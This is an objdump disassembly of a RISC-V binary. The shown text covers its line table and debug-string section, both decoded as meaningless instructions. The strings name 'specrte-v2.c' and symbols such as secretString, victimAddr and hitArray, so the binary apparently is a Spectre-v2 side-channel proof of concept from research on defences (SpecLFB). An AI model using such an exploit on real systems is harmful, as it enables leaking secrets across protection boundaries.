    193e:	04090103          	lb	sp,64(s2)
    1942:	0100                	addi	s0,sp,128
    1944:	08090303          	lb	t1,128(s2)
    1948:	0100                	addi	s0,sp,128
    194a:	0805                	addi	a6,a6,1
    194c:	0a090103          	lb	sp,160(s2)
    1950:	0100                	addi	s0,sp,128
    1952:	0705                	addi	a4,a4,1
    1954:	04090103          	lb	sp,64(s2)
    1958:	0100                	addi	s0,sp,128
    195a:	0905                	addi	s2,s2,1
    195c:	04090203          	lb	tp,64(s2)
    1960:	0100                	addi	s0,sp,128
    1962:	0805                	addi	a6,a6,1
    1964:	02090103          	lb	sp,32(s2)
    1968:	0100                	addi	s0,sp,128
    196a:	0a05                	addi	s4,s4,1
    196c:	0a097f03          	0xa097f03
    1970:	0100                	addi	s0,sp,128
    1972:	0905                	addi	s2,s2,1
    1974:	08090003          	lb	zero,128(s2)
    1978:	0100                	addi	s0,sp,128
    197a:	0705                	addi	a4,a4,1
    197c:	0a090303          	lb	t1,160(s2)
    1980:	0100                	addi	s0,sp,128
    1982:	0605                	addi	a2,a2,1
    1984:	08090003          	lb	zero,128(s2)
    1988:	0100                	addi	s0,sp,128
    198a:	1605                	addi	a2,a2,-31
    198c:	0200                	addi	s0,sp,256
    198e:	0104                	addi	s1,sp,128
    1990:	0a090003          	lb	zero,160(s2)
    1994:	0100                	addi	s0,sp,128
    1996:	1305                	addi	t1,t1,-31
    1998:	0200                	addi	s0,sp,256
    199a:	0104                	addi	s1,sp,128
    199c:	08090003          	lb	zero,128(s2)
    19a0:	0100                	addi	s0,sp,128
    19a2:	0c05                	addi	s8,s8,1
    19a4:	0a090103          	lb	sp,160(s2)
    19a8:	0100                	addi	s0,sp,128
    19aa:	1105                	addi	sp,sp,-31
    19ac:	08090003          	lb	zero,128(s2)
    19b0:	0100                	addi	s0,sp,128
    19b2:	0a05                	addi	s4,s4,1
    19b4:	14090003          	lb	zero,320(s2)
    19b8:	0100                	addi	s0,sp,128
    19ba:	0805                	addi	a6,a6,1
    19bc:	04090103          	lb	sp,64(s2)
    19c0:	0100                	addi	s0,sp,128
    19c2:	0905                	addi	s2,s2,1
    19c4:	0a090303          	lb	t1,160(s2)
    19c8:	0100                	addi	s0,sp,128
    19ca:	02090103          	lb	sp,32(s2)
    19ce:	0100                	addi	s0,sp,128
    19d0:	1005                	c.nop	-31
    19d2:	10090103          	lb	sp,256(s2)
    19d6:	0100                	addi	s0,sp,128
    19d8:	0c05                	addi	s8,s8,1
    19da:	0c090003          	lb	zero,192(s2)
    19de:	0100                	addi	s0,sp,128
    19e0:	1305                	addi	t1,t1,-31
    19e2:	06090003          	lb	zero,96(s2)
    19e6:	0100                	addi	s0,sp,128
    19e8:	0905                	addi	s2,s2,1
    19ea:	08090003          	lb	zero,128(s2)
    19ee:	0100                	addi	s0,sp,128
    19f0:	0a05                	addi	s4,s4,1
    19f2:	0a097e03          	0xa097e03
    19f6:	0100                	addi	s0,sp,128
    19f8:	0905                	addi	s2,s2,1
    19fa:	08090003          	lb	zero,128(s2)
    19fe:	0100                	addi	s0,sp,128
    1a00:	1605                	addi	a2,a2,-31
    1a02:	02090503          	lb	a0,32(s2)
    1a06:	0100                	addi	s0,sp,128
    1a08:	0200                	addi	s0,sp,256
    1a0a:	0104                	addi	s1,sp,128
    1a0c:	0306                	slli	t1,t1,0x1
    1a0e:	0900                	addi	s0,sp,144
    1a10:	0008                	0x8
    1a12:	0001                	nop
    1a14:	0402                	slli	s0,s0,0x0
    1a16:	0302                	slli	t1,t1,0x0
    1a18:	0900                	addi	s0,sp,144
    1a1a:	000a                	c.slli	zero,0x2
    1a1c:	0501                	addi	a0,a0,0
    1a1e:	0001                	nop
    1a20:	0402                	slli	s0,s0,0x0
    1a22:	0605                	addi	a2,a2,1
    1a24:	04090103          	lb	sp,64(s2)
    1a28:	0100                	addi	s0,sp,128
    1a2a:	0809                	addi	a6,a6,2
    1a2c:	0000                	unimp
    1a2e:	0101                	addi	sp,sp,0

Disassembly of section .debug_str:

0000000000000000 <.debug_str>:
   0:	645f 6f73 685f      	0x685f6f73645f
   6:	6e61                	lui	t3,0x18
   8:	6c64                	ld	s1,216(s0)
   a:	0065                	c.nop	25
   c:	6e75                	lui	t3,0x1d
   e:	7375                	lui	t1,0xffffd
  10:	6465                	lui	s0,0x19
  12:	0031                	c.nop	12
  14:	7461                	lui	s0,0xffff8
  16:	756f526b          	0x756f526b
  1a:	646e                	ld	s0,216(sp)
  1c:	5f00                	lw	s0,56(a4)
  1e:	6172                	ld	sp,280(sp)
  20:	646e                	ld	s0,216(sp)
  22:	3834                	fld	fa3,112(s0)
  24:	5f00                	lw	s0,56(a4)
  26:	6d65                	lui	s10,0x19
  28:	7265                	lui	tp,0xffff9
  2a:	636e6567          	0x636e6567
  2e:	0079                	c.nop	30
  30:	5f5f 6975 746e      	0x746e69755f5f
  36:	5f38                	lw	a4,120(a4)
  38:	0074                	addi	a3,sp,12
  3a:	4f746573          	csrrsi	a0,0x4f7,8
  3e:	6666                	ld	a2,88(sp)
  40:	00746573          	csrrsi	a0,0x7,8
  44:	6170                	ld	a2,192(a0)
  46:	6e497373          	csrrci	t1,0x6e4,18
  4a:	6449                	lui	s0,0x12
  4c:	0078                	addi	a4,sp,12
  4e:	775f 7263 6f74      	0x6f747263775f
  54:	626d                	lui	tp,0x1b
  56:	735f 6174 6574      	0x65746174735f
  5c:	5f00                	lw	s0,56(a4)
  5e:	72736377          	0x72736377
  62:	6f74                	ld	a3,216(a4)
  64:	626d                	lui	tp,0x1b
  66:	74735f73          	csrrwi	t5,0x747,6
  6a:	7461                	lui	s0,0xffff8
  6c:	0065                	c.nop	25
  6e:	6f6c                	ld	a1,216(a4)
  70:	676e                	ld	a4,216(sp)
  72:	6c20                	ld	s0,88(s0)
  74:	20676e6f          	jal	t3,7627a <_tbss_end+0x761f6>
  78:	6e75                	lui	t3,0x1d
  7a:	6e676973          	csrrsi	s2,0x6e6,14
  7e:	6465                	lui	s0,0x19
  80:	6920                	ld	s0,80(a0)
  82:	746e                	ld	s0,248(sp)
  84:	5f00                	lw	s0,56(a4)
  86:	626c                	ld	a1,192(a2)
  88:	7366                	ld	t1,120(sp)
  8a:	7a69                	lui	s4,0xffffa
  8c:	0065                	c.nop	25
  8e:	6461                	lui	s0,0x18
  90:	7264                	ld	s1,224(a2)
  92:	5f00                	lw	s0,56(a4)
  94:	695f 746e 3436      	0x3436746e695f
  9a:	745f 5f00 6c5f      	0x6c5f5f00745f
  a0:	6c61636f          	jal	t1,16766 <_tbss_end+0x166e2>
  a4:	5f65                	li	t5,-7
  a6:	0074                	addi	a3,sp,12
  a8:	6968                	ld	a0,208(a0)
  aa:	4174                	lw	a3,68(a0)
  ac:	7272                	ld	tp,312(sp)
  ae:	7961                	lui	s2,0xffff8
  b0:	5f00                	lw	s0,56(a4)
  b2:	626d                	lui	tp,0x1b
  b4:	7472                	ld	s0,312(sp)
  b6:	5f63776f          	jal	a4,376ac <_tbss_end+0x37628>
  ba:	74617473          	csrrci	s0,0x746,2
  be:	0065                	c.nop	25
  c0:	6172                	ld	sp,280(sp)
  c2:	646e                	ld	s0,216(sp)
  c4:	6449                	lui	s0,0x12
  c6:	0078                	addi	a4,sp,12
  c8:	775f 7463 6d6f      	0x6d6f7463775f
  ce:	5f62                	lw	t5,56(sp)
  d0:	74617473          	csrrci	s0,0x746,2
  d4:	0065                	c.nop	25
  d6:	5f5f 6d74 735f      	0x735f6d745f5f
  dc:	6365                	lui	t1,0x19
  de:	7700                	ld	s0,40(a4)
  e0:	7961                	lui	s2,0xffff8
  e2:	7366664f          	fnmadd.d	fa2,fa2,fs6,fa4,unknown
  e6:	7465                	lui	s0,0xffff9
  e8:	6c00                	ld	s0,24(s0)
  ea:	20676e6f          	jal	t3,762f0 <_tbss_end+0x7626c>
  ee:	6f6c                	ld	a1,216(a4)
  f0:	676e                	ld	a4,216(sp)
  f2:	6920                	ld	s0,80(a0)
  f4:	746e                	ld	s0,248(sp)
  f6:	5f00                	lw	s0,56(a4)
  f8:	6275                	lui	tp,0x1d
  fa:	6675                	lui	a2,0x1d
  fc:	5f00                	lw	s0,56(a4)
  fe:	6162                	ld	sp,24(sp)
 100:	64006573          	csrrsi	a0,0x640,0
 104:	6d75                	lui	s10,0x1d
 106:	796d                	lui	s2,0xffffb
 108:	5f00                	lw	s0,56(a4)
 10a:	745f 5f6d 6f68      	0x6f685f6d745f
 110:	7275                	lui	tp,0xffffd
 112:	5f00                	lw	s0,56(a4)
 114:	735f 0066 6f5f      	0x6f5f0066735f
 11a:	5f6e                	lw	t5,248(sp)
 11c:	7865                	lui	a6,0xffff9
 11e:	7469                	lui	s0,0xffffa
 120:	615f 6772 0073      	0x736772615f
 126:	7461                	lui	s0,0xffff8
 128:	6174                	ld	a3,192(a0)
 12a:	64496b63          	bltu	s2,tp,780 <_tbss_end+0x6fc>
 12e:	0078                	addi	a4,sp,12
 130:	635f 6f6f 696b      	0x696b6f6f635f
 136:	0065                	c.nop	25
 138:	5f5f 6773 756c      	0x756c67735f5f
 13e:	0065                	c.nop	25
 140:	665f 616c 7367      	0x7367616c665f
 146:	5f00                	lw	s0,56(a4)
 148:	7369                	lui	t1,0xffffa
 14a:	635f 6178 5f00      	0x5f006178635f
 150:	69647473          	csrrci	s0,0x696,8
 154:	006e                	c.slli	zero,0x1b
 156:	5674756f          	jal	a0,47ebc <_tbss_end+0x47e38>
 15a:	6c61                	lui	s8,0x18
 15c:	7241                	lui	tp,0xffff0
 15e:	6172                	ld	sp,280(sp)
 160:	0079                	c.nop	30
 162:	625f 6b6c 6973      	0x69736b6c625f
 168:	657a                	ld	a0,408(sp)
 16a:	5f00                	lw	s0,56(a4)
 16c:	62747663          	bleu	t2,s0,798 <_tbss_end+0x714>
 170:	6675                	lui	a2,0x1d
 172:	5f00                	lw	s0,56(a4)
 174:	7366666f          	jal	a2,668aa <_tbss_end+0x66826>
 178:	7465                	lui	s0,0xffff9
 17a:	5f00                	lw	s0,56(a4)
 17c:	626d                	lui	tp,0x1b
 17e:	6f747273          	csrrci	tp,0x6f7,8
 182:	5f736377          	0x5f736377
 186:	74617473          	csrrci	s0,0x746,2
 18a:	0065                	c.nop	25
 18c:	6d5f 7262 656c      	0x656c72626d5f
 192:	5f6e                	lw	t5,248(sp)
 194:	74617473          	csrrci	s0,0x746,2
 198:	0065                	c.nop	25
 19a:	6170                	ld	a2,192(a0)
 19c:	6e497373          	csrrci	t1,0x6e4,18
 1a0:	6441                	lui	s0,0x10
 1a2:	7264                	ld	s1,224(a2)
 1a4:	5f00                	lw	s0,56(a4)
 1a6:	6e66                	ld	t3,88(sp)
 1a8:	7261                	lui	tp,0xffff8
 1aa:	5f007367          	0x5f007367
 1ae:	6e66                	ld	t3,88(sp)
 1b0:	735f0073          	0x735f0073
 1b4:	6769                	lui	a4,0x1a
 1b6:	006e                	c.slli	zero,0x1b
 1b8:	5f5f 6d74 0070      	0x706d745f5f
 1be:	665f 6f6c 6b63      	0x6b636f6c665f
 1c4:	745f 5f00 7473      	0x74735f00745f
 1ca:	6564                	ld	s1,200(a0)
 1cc:	7272                	ld	tp,312(sp)
 1ce:	5f00                	lw	s0,56(a4)
 1d0:	6942                	ld	s2,16(sp)
 1d2:	746e6967          	0x746e6967
 1d6:	5f00                	lw	s0,56(a4)
 1d8:	6d6d6167          	0x6d6d6167
 1dc:	5f61                	li	t5,-8
 1de:	6e676973          	csrrsi	s2,0x6e6,14
 1e2:	006d6167          	0x6d6167
 1e6:	725f 6165 0064      	0x646165725f
 1ec:	725f 7365 6c75      	0x6c757365725f
 1f2:	5f74                	lw	a3,124(a4)
 1f4:	5f5f006b          	0x5f5f006b
 1f8:	6d74                	ld	a3,216(a0)
 1fa:	6900                	ld	s0,16(a0)
 1fc:	416e                	lw	sp,216(sp)
 1fe:	7272                	ld	tp,312(sp)
 200:	7961                	lui	s2,0xffff8
 202:	657a6953          	0x657a6953
 206:	5f00                	lw	s0,56(a4)
 208:	775f 6863 0062      	0x626863775f
 20e:	735f 6474 756f      	0x756f6474735f
 214:	0074                	addi	a3,sp,12
 216:	635f 7476 656c      	0x656c7476635f
 21c:	006e                	c.slli	zero,0x1b
 21e:	6e69                	lui	t3,0x1a
 220:	7241                	lui	tp,0xffff0
 222:	6172                	ld	sp,280(sp)
 224:	0079                	c.nop	30
 226:	665f 6c69 0065      	0x656c69665f
 22c:	6e5f 6f69 7362      	0x73626f696e5f
 232:	7700                	ld	s0,40(a4)
 234:	6e61                	lui	t3,0x18
 236:	4674                	lw	a3,76(a2)
 238:	6e75                	lui	t3,0x1d
 23a:	68730063          	beq	t1,t2,8ba <_tbss_end+0x836>
 23e:	2074726f          	jal	tp,47c44 <_tbss_end+0x47bc0>
 242:	6e75                	lui	t3,0x1d
 244:	6e676973          	csrrsi	s2,0x6e6,14
 248:	6465                	lui	s0,0x19
 24a:	6920                	ld	s0,80(a0)
 24c:	746e                	ld	s0,248(sp)
 24e:	5f00                	lw	s0,56(a4)
 250:	7461                	lui	s0,0xffff8
 252:	7865                	lui	a6,0xffff9
 254:	7469                	lui	s0,0xffffa
 256:	0030                	addi	a2,sp,8
 258:	6c66                	ld	s8,88(sp)
 25a:	7375                	lui	t1,0xffffd
 25c:	4368                	lw	a0,68(a4)
 25e:	6361                	lui	t1,0x18
 260:	6568                	ld	a0,200(a0)
 262:	5f00                	lw	s0,56(a4)
 264:	6e676973          	csrrsi	s2,0x6e6,14
 268:	6c61                	lui	s8,0x18
 26a:	625f 6675 5f00      	0x5f006675625f
 270:	7361                	lui	t1,0xffff8
 272:	6d697463          	bleu	s6,s2,93a <_tbss_end+0x8b6>
 276:	5f65                	li	t5,-7
 278:	7562                	ld	a0,56(sp)
 27a:	0066                	c.slli	zero,0x19
 27c:	725f 7365 6c75      	0x6c757365725f
 282:	0074                	addi	a3,sp,12
 284:	5f5f 6377 0068      	0x6863775f5f
 28a:	746e6977          	0x746e6977
 28e:	745f 5f00 6f6c      	0x6f6c5f00745f
 294:	5f006b63          	bltu	zero,a6,88a <_tbss_end+0x806>
 298:	6c66                	ld	s8,88(sp)
 29a:	6761                	lui	a4,0x18
 29c:	76003273          	csrrc	tp,0x760,zero
 2a0:	6369                	lui	t1,0x1a
 2a2:	6974                	ld	a3,208(a0)
 2a4:	466d                	li	a2,27
 2a6:	6e75                	lui	t3,0x1d
 2a8:	775f0063          	beq	t5,s5,a08 <_tbss_end+0x984>
 2ac:	6972                	ld	s2,280(sp)
 2ae:	6574                	ld	a3,200(a0)
 2b0:	4700                	lw	s0,8(a4)
 2b2:	554e                	lw	a0,240(sp)
 2b4:	4320                	lw	s0,64(a4)
 2b6:	3131                	addiw	sp,sp,-20
 2b8:	3720                	fld	fs0,104(a4)
 2ba:	322e                	fld	ft4,232(sp)
 2bc:	302e                	fld	ft0,232(sp)
 2be:	2d20                	fld	fs0,88(a0)
 2c0:	636d                	lui	t1,0x1b
 2c2:	6f6d                	lui	t5,0x1b
 2c4:	6564                	ld	s1,200(a0)
 2c6:	3d6c                	fld	fa1,248(a0)
 2c8:	656d                	lui	a0,0x1b
 2ca:	6164                	ld	s1,192(a0)
 2cc:	796e                	ld	s2,248(sp)
 2ce:	2d20                	fld	fs0,88(a0)
 2d0:	616d                	addi	sp,sp,240
 2d2:	6372                	ld	t1,280(sp)
 2d4:	3d68                	fld	fa0,248(a0)
 2d6:	7672                	ld	a2,312(sp)
 2d8:	3436                	fld	fs0,360(sp)
 2da:	6d69                	lui	s10,0x1a
 2dc:	6661                	lui	a2,0x18
 2de:	6364                	ld	s1,192(a4)
 2e0:	2d20                	fld	fs0,88(a0)
 2e2:	616d                	addi	sp,sp,240
 2e4:	6962                	ld	s2,24(sp)
 2e6:	6c3d                	lui	s8,0xf
 2e8:	3670                	fld	fa2,232(a2)
 2ea:	6434                	ld	a3,72(s0)
 2ec:	2d20                	fld	fs0,88(a0)
 2ee:	4f2d2067          	0x4f2d2067
 2f2:	2030                	fld	fa2,64(s0)
 2f4:	662d                	lui	a2,0xb
 2f6:	6f6e                	ld	t5,216(sp)
 2f8:	632d                	lui	t1,0xb
 2fa:	6f6d6d6f          	jal	s10,d69f0 <_tbss_end+0xd696c>
 2fe:	206e                	fld	ft0,216(sp)
 300:	662d                	lui	a2,0xb
 302:	6f6e                	ld	t5,216(sp)
 304:	622d                	lui	tp,0xb
 306:	6975                	lui	s2,0x1d
 308:	746c                	ld	a1,232(s0)
 30a:	6e69                	lui	t3,0x1a
 30c:	702d                	c.lui	zero,0xfffeb
 30e:	6972                	ld	s2,280(sp)
 310:	746e                	ld	s0,248(sp)
 312:	0066                	c.slli	zero,0x19
 314:	6e75                	lui	t3,0x1d
 316:	7375                	lui	t1,0xffffd
 318:	6465                	lui	s0,0x19
 31a:	0032                	c.slli	zero,0xc
 31c:	7074756f          	jal	a0,48222 <_tbss_end+0x4819e>
 320:	7475                	lui	s0,0xffffd
 322:	5f00                	lw	s0,56(a4)
 324:	6d6e                	ld	s10,216(sp)
 326:	6c61                	lui	s8,0x18
 328:	6f6c                	ld	a1,216(a4)
 32a:	6f740063          	beq	s0,s7,a0a <_tbss_end+0x986>
 32e:	5470                	lw	a2,108(s0)
 330:	64496f77          	0x64496f77
 334:	0078                	addi	a4,sp,12
 336:	6f6c                	ld	a1,216(a4)
 338:	676e                	ld	a4,216(sp)
 33a:	6420                	ld	s0,72(s0)
 33c:	6c62756f          	jal	a0,27a02 <_tbss_end+0x2797e>
 340:	0065                	c.nop	25
 342:	6976                	ld	s2,344(sp)
 344:	6d697463          	bleu	s6,s2,a0c <_tbss_end+0x988>
 348:	6441                	lui	s0,0x10
 34a:	7264                	ld	s1,224(a2)
 34c:	5f00                	lw	s0,56(a4)
 34e:	656e                	ld	a0,216(sp)
 350:	7478                	ld	a4,232(s0)
 352:	0066                	c.slli	zero,0x19
 354:	72636573          	csrrsi	a0,0x726,6
 358:	7465                	lui	s0,0xffff9
 35a:	69727453          	0x69727453
 35e:	676e                	ld	a4,216(sp)
 360:	5f00                	lw	s0,56(a4)
 362:	745f 5f6d 6f6d      	0x6f6d5f6d745f
 368:	006e                	c.slli	zero,0x1b
 36a:	615f 6574 6978      	0x69786574615f
 370:	0074                	addi	a3,sp,12
 372:	5f5f 6473 6469      	0x646964735f5f
 378:	6e69                	lui	t3,0x1a
 37a:	7469                	lui	s0,0xffffa
 37c:	5f00                	lw	s0,56(a4)
 37e:	5f66666f          	jal	a2,66974 <_tbss_end+0x668f0>
 382:	0074                	addi	a3,sp,12
 384:	7261                	lui	tp,0xffff8
 386:	6172                	ld	sp,280(sp)
 388:	3179                	addiw	sp,sp,-2
 38a:	6100                	ld	s0,0(a0)
 38c:	7272                	ld	tp,312(sp)
 38e:	7961                	lui	s2,0xffff8
 390:	0032                	c.slli	zero,0xc
 392:	5f5f 6975 746e      	0x746e69755f5f
 398:	3436                	fld	fs0,360(sp)
 39a:	745f 5f00 7266      	0x72665f00745f
 3a0:	6565                	lui	a0,0x19
 3a2:	696c                	ld	a1,208(a0)
 3a4:	5f007473          	csrrci	s0,0x5f0,0
 3a8:	4f4c                	lw	a1,28(a4)
 3aa:	525f4b43          	fmadd.d	fs6,ft10,ft5,fa0,rmm
 3ae:	4345                	li	t1,17
 3b0:	5255                	li	tp,-11
 3b2:	45564953          	0x45564953
 3b6:	545f 6e00 6d75      	0x6d756e00545f
 3bc:	73746553          	0x73746553
 3c0:	61656c43          	fmadd.s	fs8,fa0,fs6,fa2,unknown
 3c4:	0072                	c.slli	zero,0x1c
 3c6:	6e75                	lui	t3,0x1d
 3c8:	6e676973          	csrrsi	s2,0x6e6,14
 3cc:	6465                	lui	s0,0x19
 3ce:	6320                	ld	s0,64(a4)
 3d0:	6168                	ld	a0,192(a0)
 3d2:	0072                	c.slli	zero,0x1c
 3d4:	7564                	ld	s1,232(a0)
 3d6:	6d6d                	lui	s10,0x1b
 3d8:	4d79                	li	s10,30
 3da:	6d65                	lui	s10,0x19
 3dc:	5f00                	lw	s0,56(a4)
 3de:	656e                	ld	a0,216(sp)
 3e0:	685f0077          	0x685f0077
 3e4:	655f 7272 6f6e      	0x6f6e7272655f
 3ea:	7300                	ld	s0,32(a4)
 3ec:	6f68                	ld	a0,216(a4)
 3ee:	7472                	ld	s0,312(sp)
 3f0:	6920                	ld	s0,80(a0)
 3f2:	746e                	ld	s0,248(sp)
 3f4:	5f00                	lw	s0,56(a4)
 3f6:	745f 5f6d 6479      	0x64795f6d745f
 3fc:	7961                	lui	s2,0xffff8
 3fe:	5f00                	lw	s0,56(a4)
 400:	735f 7562 0066      	0x667562735f
 406:	695f 626f 0073      	0x73626f695f
 40c:	5f5f 4946 454c      	0x454c49465f5f
 412:	5f00                	lw	s0,56(a4)
 414:	626d                	lui	tp,0x1b
 416:	74617473          	csrrci	s0,0x746,2
 41a:	5f65                	li	t5,-7
 41c:	0074                	addi	a3,sp,12
 41e:	5f5f 4673 4c49      	0x4c4946735f5f
 424:	0045                	c.nop	17
 426:	6d5f 7362 6174      	0x617473626d5f
 42c:	6574                	ld	a3,200(a0)
 42e:	5f00                	lw	s0,56(a4)
 430:	6172                	ld	sp,280(sp)
 432:	646e                	ld	s0,216(sp)
 434:	6e5f 7865 0074      	0x7478656e5f
 43a:	6d5f 6c62 6e65      	0x6e656c626d5f
 440:	735f 6174 6574      	0x65746174735f
 446:	5f00                	lw	s0,56(a4)
 448:	6e69                	lui	t3,0x1a
 44a:	695f0063          	beq	t5,s5,aca <_tbss_end+0xa46>
 44e:	646e                	ld	s0,216(sp)
 450:	5f00                	lw	s0,56(a4)
 452:	6f6c                	ld	a1,216(a4)
 454:	656c6163          	bltu	s8,s6,a96 <_tbss_end+0xa12>
 458:	5f00                	lw	s0,56(a4)
 45a:	635f 656c 6e61      	0x6e61656c635f
 460:	7075                	c.lui	zero,0xffffd
 462:	5f00                	lw	s0,56(a4)
 464:	6e75                	lui	t3,0x1d
 466:	63657073          	csrci	0x636,10
 46a:	6669                	lui	a2,0x1a
 46c:	6569                	lui	a0,0x1a
 46e:	5f64                	lw	s1,124(a4)
 470:	6f6c                	ld	a1,216(a4)
 472:	656c6163          	bltu	s8,s6,ab4 <_tbss_end+0xa30>
 476:	695f 666e 006f      	0x6f666e695f
 47c:	6d5f 7861 6477      	0x647778616d5f
 482:	725f0073          	0x725f0073
 486:	6565                	lui	a0,0x19
 488:	746e                	ld	s0,248(sp)
 48a:	5f00                	lw	s0,56(a4)
 48c:	64656573          	csrrsi	a0,0x646,10
 490:	5f00                	lw	s0,56(a4)
 492:	635f 756f 746e      	0x746e756f635f
 498:	5f00                	lw	s0,56(a4)
 49a:	765f 6c61 6575      	0x65756c61765f
 4a0:	5f00                	lw	s0,56(a4)
 4a2:	6b656573          	csrrsi	a0,0x6b6,10
 4a6:	2f00                	fld	fs0,24(a4)
 4a8:	6f68                	ld	a0,216(a4)
 4aa:	656d                	lui	a0,0x1b
 4ac:	6568632f          	0x6568632f
 4b0:	676e                	ld	a4,216(sp)
 4b2:	6978                	ld	a4,208(a0)
 4b4:	6f61                	lui	t5,0x18
 4b6:	7579                	lui	a0,0xffffe
 4b8:	6570532f          	0x6570532f
 4bc:	42464c63          	blt	a2,tp,8f4 <_tbss_end+0x870>
 4c0:	7474612f          	0x7474612f
 4c4:	6361                	lui	t1,0x18
 4c6:	78655f6b          	0x78655f6b
 4ca:	6d65                	lui	s10,0x19
 4cc:	6c70                	ld	a2,216(s0)
 4ce:	5f65                	li	t5,-7
 4d0:	6972                	ld	s2,280(sp)
 4d2:	00766373          	csrrsi	t1,0x7,12
 4d6:	665f 6f70 5f73      	0x5f736f70665f
 4dc:	0074                	addi	a3,sp,12
 4de:	5f5f 6d74 795f      	0x795f6d745f5f
 4e4:	6165                	addi	sp,sp,112
 4e6:	0072                	c.slli	zero,0x1c
 4e8:	5f5f 6d74 6d5f      	0x6d5f6d745f5f
 4ee:	6e69                	lui	t3,0x1a
 4f0:	6300                	ld	s0,0(a4)
 4f2:	6449                	lui	s0,0x12
 4f4:	0078                	addi	a4,sp,12
 4f6:	4974756f          	jal	a0,4818c <_tbss_end+0x48108>
 4fa:	7864                	ld	s1,240(s0)
 4fc:	7241                	lui	tp,0xffff0
 4fe:	6172                	ld	sp,280(sp)
 500:	0079                	c.nop	30
 502:	665f 746e 7079      	0x7079746e665f
 508:	7365                	lui	t1,0xffff9
 50a:	5f00                	lw	s0,56(a4)
 50c:	756d                	lui	a0,0xffffb
 50e:	746c                	ld	a1,232(s0)
 510:	5f00                	lw	s0,56(a4)
 512:	74727473          	csrrci	s0,0x747,4
 516:	6c5f6b6f          	jal	s6,f73da <_tbss_end+0xf7356>
 51a:	7361                	lui	t1,0xffff8
 51c:	0074                	addi	a3,sp,12
 51e:	6964                	ld	s1,208(a0)
 520:	6666                	ld	a2,88(sp)
 522:	7300                	ld	s0,32(a4)
 524:	6372                	ld	t1,280(sp)
 526:	6570732f          	0x6570732f
 52a:	65727463          	bleu	s7,tp,b72 <_tbss_end+0xaee>
 52e:	762d                	lui	a2,0xfffeb
 530:	2e32                	fld	ft8,264(sp)
 532:	615f0063          	beq	t5,s5,b32 <_tbss_end+0xaae>
 536:	6464                	ld	s1,200(s0)
 538:	5f00                	lw	s0,56(a4)
 53a:	555f 6f4c 676e      	0x676e6f4c555f
 540:	7700                	ld	s0,40(a4)
 542:	6e61                	lui	t3,0x18
 544:	4174                	lw	a3,68(a0)
 546:	6464                	ld	s1,200(s0)
 548:	0072                	c.slli	zero,0x1c
 54a:	675f 7465 6164      	0x61647465675f
 550:	6574                	ld	a3,200(a0)
 552:	655f 7272 5f00      	0x5f007272655f
 558:	626f6c67          	0x626f6c67
 55c:	6c61                	lui	s8,0x18
 55e:	695f 706d 7275      	0x7275706d695f
 564:	5f65                	li	t5,-7
 566:	7470                	ld	a2,232(s0)
 568:	0072                	c.slli	zero,0x1c
 56a:	6c61                	lui	s8,0x18
 56c:	6769                	lui	a4,0x1a
 56e:	656e                	ld	a0,216(sp)
 570:	4d64                	lw	s1,92(a0)
 572:	6d65                	lui	s10,0x19
 574:	5f00                	lw	s0,56(a4)
 576:	6e75                	lui	t3,0x1d
 578:	7375                	lui	t1,0xffffd
 57a:	6465                	lui	s0,0x19
 57c:	725f 6e61 0064      	0x646e61725f
 582:	775f 7364 5f00      	0x5f007364775f
 588:	745f 5f6d 6477      	0x64775f6d745f
 58e:	7961                	lui	s2,0xffff8
 590:	5f00                	lw	s0,56(a4)
 592:	65756c67          	0x65756c67
 596:	5f00                	lw	s0,56(a4)
 598:	7a697373          	csrrci	t1,0x7a6,18
 59c:	5f65                	li	t5,-7
 59e:	0074                	addi	a3,sp,12
 5a0:	6c5f 3436 5f61      	0x5f6134366c5f
 5a6:	7562                	ld	a0,56(sp)
 5a8:	0066                	c.slli	zero,0x19
 5aa:	735f 6769 665f      	0x665f6769735f
 5b0:	6e75                	lui	t3,0x1d
 5b2:	6e5f0063          	beq	t5,t0,c92 <_tbss_end+0xc0e>
 5b6:	7562                	ld	a0,56(sp)
 5b8:	0066                	c.slli	zero,0x19
 5ba:	755f 756e 6573      	0x6573756e755f
 5c0:	0064                	addi	s1,sp,12
 5c2:	5f5f 6d74 695f      	0x695f6d745f5f
 5c8:	74736473          	csrrsi	s0,0x747,6
 5cc:	5f00                	lw	s0,56(a4)
 5ce:	6f6c                	ld	a1,216(a4)
 5d0:	746c6163          	bltu	s8,t1,d12 <_tbss_end+0xc8e>
 5d4:	6d69                	lui	s10,0x1a
 5d6:	5f65                	li	t5,-7
 5d8:	7562                	ld	a0,56(sp)
 5da:	0066                	c.slli	zero,0x19
 5dc:	635f 6f6c 6573      	0x65736f6c635f
 5e2:	5f00                	lw	s0,56(a4)
 5e4:	3472                	fld	fs0,312(sp)
 5e6:	0038                	addi	a4,sp,8
 5e8:	72617473          	csrrci	s0,0x726,2
 5ec:	0074                	addi	a3,sp,12
 5ee:	6d5f 7462 776f      	0x776f74626d5f
 5f4:	74735f63          	ble	t2,t1,d52 <_tbss_end+0xcce>
 5f8:	7461                	lui	s0,0xffff8
 5fa:	0065                	c.nop	25
 5fc:	6572                	ld	a0,280(sp)
 5fe:	746c7573          	csrrci	a0,0x746,24
 602:	705f0073          	0x705f0073
 606:	7335                	lui	t1,0xfffed
 608:	6100                	ld	s0,0(a0)
 60a:	7272                	ld	tp,312(sp)
 60c:	7961                	lui	s2,0xffff8
 60e:	5f31                	li	t5,-20
 610:	6d007a73          	csrrci	s4,0x6d0,0
 614:	6961                	lui	s2,0x18
 616:	006e                	c.slli	zero,0x1b
 618:	5f5f 6d74 6d5f      	0x6d5f6d745f5f
 61e:	6164                	ld	s1,192(a0)
 620:	0079                	c.nop	30
 622:	2f637273          	csrrci	tp,0x2f6,6
 626:	2e747263          	bleu	t2,s0,90a <_tbss_end+0x886>
 62a:	682f0053          	0x682f0053
 62e:	2f656d6f          	jal	s10,56924 <_tbss_end+0x568a0>
 632:	6e656863          	bltu	a0,t1,d22 <_tbss_end+0xc9e>
 636:	61697867          	0x61697867
 63a:	2f75796f          	jal	s2,58130 <_tbss_end+0x580ac>
 63e:	63657053          	0x63657053
 642:	464c                	lw	a1,12(a2)
 644:	2f42                	fld	ft10,16(sp)
 646:	7461                	lui	s0,0xffff8
 648:	6174                	ld	a3,192(a0)
 64a:	65206b63          	bltu	zero,s2,ca0 <_tbss_end+0xc1c>
 64e:	6578                	ld	a4,200(a0)
 650:	706d                	c.lui	zero,0xffffb
 652:	656c                	ld	a1,200(a0)
 654:	4700                	lw	s0,8(a4)
 656:	554e                	lw	a0,240(sp)
 658:	4120                	lw	s0,64(a0)
 65a:	2e322053          	0x2e322053
 65e:	3932                	fld	fs2,296(sp)
